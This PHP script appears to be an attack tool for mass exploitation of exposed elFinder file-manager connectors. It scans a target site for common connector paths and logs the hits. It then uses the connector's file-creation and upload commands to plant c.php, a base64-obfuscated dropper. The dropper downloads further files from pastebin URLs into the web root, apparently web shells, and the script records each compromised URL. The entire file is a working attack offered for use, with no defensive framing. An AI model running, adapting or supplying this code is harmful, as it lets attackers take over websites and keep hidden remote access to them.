<?php
error_reporting(0);
$url = $argv[1]; //http://site.com/sites/all/libraries/elfinder/connectors/php/connector.php
            $explc=array("/chronic/elfinder/php/connector.php","/sites/all/libraries/elfinder/php/connector.php","/extension/elfinder/php/connector.php","/elfinder/php/connector.php","/admin/js/plugins/elfinder/php/connector.php","/assets/cms/full/elfinder/php/connector.php","/cms/full/elfinder/php/connector.php","/admin/elfinder/php/connector.php");
            foreach($explc as $arrc){
	$exc=$arrc;
	$nanic=$url.$exc;
		$ch = curl_init();
		curl_setopt($ch,CURLOPT_URL,$nanic);
		curl_setopt($ch,CURLOPT_POST,1);
		curl_setopt($ch,CURLOPT_POSTFIELDS,array());
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,3);
	        curl_setopt($ch,CURLOPT_TIMEOUT,3);
		$data = curl_exec($ch);
		$cnlol = @file_get_contents($nanic);

			if(preg_match('#error#i',$cnlol)){
			echo "\n\t[#] Found!\n\t[#]Exploied $url\n\t----------------------------------------------------------------\n";
			            $save = fopen ('elfind.txt','a+');
                                    fwrite ($save,$nanic."\n");
$nama_doang = "c.php"; //ini cuma nama
 
$isi_nama_doang = "PD9waHAKZWNobyAnPHRpdGxlPlVwbG9hZCBGaWxlcyB4U2VjdXJpdHk8L3RpdGxlPic7CmZ1bmN0
aW9uIGh0dHBfZ2V0KCR1cmwpewokaW0gPSBjdXJsX2luaXQoJHVybCk7CmN1cmxfc2V0b3B0KCRp
bSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CmN1cmxfc2V0b3B0KCRpbSwgQ1VSTE9QVF9D
T05ORUNUVElNRU9VVCwgMTApOwpjdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfRk9MTE9XTE9DQVRJ
T04sIDEpOwpjdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfSEVBREVSLCAwKTsKcmV0dXJuIGN1cmxf
ZXhlYygkaW0pOwpjdXJsX2Nsb3NlKCRpbSk7Cn0KJGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5U
X1JPT1QnXSAuICIvZGF5aW0ucGhwIiA7CiR0ZXh0ID0gaHR0cF9nZXQoJ2h0dHA6Ly9wYXN0ZWJp
bi5jb20vcmF3LzU0YU1FVFFwJyk7CiRvcGVuID0gZm9wZW4oJGNoZWNrLCAndycpOwpmd3JpdGUo
JG9wZW4sICR0ZXh0KTsKZmNsb3NlKCRvcGVuKTsKaWYoZmlsZV9leGlzdHMoJGNoZWNrKSl7CmVj
aG8gJGNoZWNrLiI8L2JyPiI7Cn1lbHNlIAplY2hvICJub3QgZXhpdHMiOwplY2hvICJkb25lIC5c
biAiIDsKCiRjaGVjazAgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi91bi5waHAiIDsK
JHRleHQwID0gaHR0cF9nZXQoJ2h0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3L0RYUUV5SEtLJyk7CiRv
cGVuMCA9IGZvcGVuKCRjaGVjazAsICd3Jyk7CmZ3cml0ZSgkb3BlbjAsICR0ZXh0MCk7CmZjbG9z
ZSgkb3BlbjApOwppZihmaWxlX2V4aXN0cygkY2hlY2swKSl7CmVjaG8gJGNoZWNrMC4iPC9icj4i
Owp9ZWxzZSAKZWNobyAibm90IGV4aXRzIjsKZWNobyAiZG9uZSAuXG4gIiA7CiRjaGVjazM9JF9T
RVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvaXpvY2luLnR4dCIgOwokdGV4dDMgPSBodHRwX2dl
dCgnaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvaXdjZFZiVWonKTsKJG9wMz1mb3BlbigkY2hlY2sz
LCAndycpOwpmd3JpdGUoJG9wMywkdGV4dDMpOwpmY2xvc2UoJG9wMyk7CmlmKGZpbGVfZXhpc3Rz
KCRjaGVjazMpKXsKZWNobyAkY2hlY2szLiI8L2JyPiI7Cn1lbHNlIAplY2hvICJub3QgZXhpdHMi
OwplY2hvICJkb25lIC5cbiAiIDsKPz4=";
 
 
$decode_isi = base64_decode($isi_nama_doang);
$encode = base64_encode($nama_doang);
 
$fp = fopen($nama_doang,"w");
fputs($fp, $decode_isi);
 
function ngirim($url, $isi){
 
 
$ch = curl_init ("$url");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);
return $data3;
 
}
echo "\n# $site\n# Uploading 1...\n";
$url_mkfile = "$nanic?cmd=mkfile&name=$nama_doang&target=l1_Lw";
$b = file_get_contents("$url_mkfile");
 
 $post1 = array(
                    "cmd" => "put",
                    "target" => "l1_$encode",
                    "content" => "$decode_isi",
                   
                    );
 $post2 = array(
                   
                    "current" => "8ea8853cb93f2f9781e0bf6e857015ea",
                    "upload[]" => "@$nama_doang",
                   
                    );
 
$output_mkfile = ngirim("$nanic", $post1);
if(preg_match("/$nama_doang/", $output_mkfile)){
    echo "# Upload Success 1... => Yeah\n";
$sp = "/../../files/c.php";
$urlm = $nanic.$sp;

		$km = @file_get_contents($urlm);

			if(preg_match('#izocin.txt#i',$km)){
			            $save = fopen ('elfindshell.txt','a+');
                                    fwrite ($save,$urlm."\n");
}
else{
 
echo "# Upload Failed 1 \n# Uploading 2..\n";
$upload_ah = ngirim("$nanic?cmd=upload", $post2);
if(preg_match("/$nama_doang/", $upload_ah)){
}
else{
    echo "# Upload Failed 2\n\n";
}
}
}		
else{
				echo "";
}
}
}
?>